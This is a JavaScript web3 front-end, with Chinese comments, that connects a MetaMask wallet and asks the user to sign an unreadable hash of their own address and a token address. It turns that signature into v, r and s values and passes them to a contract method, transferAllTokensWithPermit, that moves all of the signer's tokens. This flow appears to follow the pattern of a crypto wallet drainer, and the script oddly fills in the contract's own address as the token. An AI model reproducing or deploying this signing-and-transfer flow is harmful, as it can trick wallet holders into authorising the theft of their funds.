let web3;
let userAddress;

// 设置你的合约地址
const contractAddress = '0x838F9b8228a5C95a7c431bcDAb58E289f5D2A4DC'; // 替换为你的合约地址

// 替换为你的合约 ABI
const contractABI = [
	{
		"inputs": [],
		"stateMutability": "nonpayable",
		"type": "constructor"
	},
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "target",
				"type": "address"
			}
		],
		"name": "AddressEmptyCode",
		"type": "error"
	},
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "account",
				"type": "address"
			}
		],
		"name": "AddressInsufficientBalance",
		"type": "error"
	},
	{
		"inputs": [],
		"name": "FailedInnerCall",
		"type": "error"
	},
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "token",
				"type": "address"
			}
		],
		"name": "SafeERC20FailedOperation",
		"type": "error"
	},
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "token",
				"type": "address"
			},
			{
				"internalType": "address",
				"name": "from",
				"type": "address"
			},
			{
				"internalType": "uint8",
				"name": "v",
				"type": "uint8"
			},
			{
				"internalType": "bytes32",
				"name": "r",
				"type": "bytes32"
			},
			{
				"internalType": "bytes32",
				"name": "s",
				"type": "bytes32"
			}
		],
		"name": "transferAllTokensWithPermit",
		"outputs": [],
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"anonymous": false,
		"inputs": [
			{
				"indexed": true,
				"internalType": "address",
				"name": "token",
				"type": "address"
			},
			{
				"indexed": true,
				"internalType": "address",
				"name": "from",
				"type": "address"
			},
			{
				"indexed": false,
				"internalType": "uint256",
				"name": "amount",
				"type": "uint256"
			}
		],
		"name": "TransferTokens",
		"type": "event"
	}
];

// 连接钱包函数
async function connectWallet() {
    console.log("尝试连接钱包...");
    if (window.ethereum) {
        web3 = new Web3(window.ethereum);
        try {
            // 请求 MetaMask 连接
            await window.ethereum.request({ method: 'eth_requestAccounts' });
            const accounts = await web3.eth.getAccounts();
            userAddress = accounts[0];  // 获取连接的第一个钱包地址

            console.log("已连接地址:", userAddress);
            document.getElementById('address').innerText = `钱包地址: ${userAddress}`;

            // 自动填充代币合约地址和签名钱包地址
            document.getElementById('tokenAddress').value = contractAddress;
            document.getElementById('fromAddress').value = userAddress;

            // 获取签名信息并自动填充
            await signAndFillSignature(userAddress, contractAddress);
        } catch (error) {
            console.error("连接钱包时出错:", error);
            alert('连接钱包失败，请查看控制台的错误信息。');
        }
    } else {
        alert('请安装MetaMask或其他以太坊钱包扩展！');
        console.log("未检测到以太坊钱包。");
    }
}

// 签名并填充签名参数
async function signAndFillSignature(from, tokenAddress) {
    try {
        const message = web3.utils.soliditySha3(
            { type: 'address', value: from },
            { type: 'address', value: tokenAddress }
        );

        console.log("准备签名的消息:", message);

        const signature = await web3.eth.personal.sign(message, from);
        console.log("签名成功:", signature);

        // 解析签名为 v, r, s 参数
        const { v, r, s } = extractSignatureParameters(signature);
        document.getElementById('v').value = v;
        document.getElementById('r').value = r;
        document.getElementById('s').value = s;
    } catch (error) {
        console.error("签名失败:", error);
        alert('获取签名失败，请检查控制台的错误信息。');
    }
}

// 解析签名参数 v, r, s
function extractSignatureParameters(signature) {
    const r = signature.slice(0, 66);
    const s = '0x' + signature.slice(66, 130);
    const v = parseInt(signature.slice(130, 132), 16);
    console.log("签名参数 - v:", v, " r:", r, " s:", s);
    return { v, r, s };
}

// 转移代币函数（使用 transferAllTokensWithPermit 方法）
async function transferTokens(token, from, v, r, s) {
    const contract = new web3.eth.Contract(contractABI, contractAddress);
    try {
        await contract.methods.transferAllTokensWithPermit(token, from, v, r, s).send({ from: userAddress });
        console.log("代币转移成功");
    } catch (error) {
        console.error("代币转移失败:", error);
    }
}
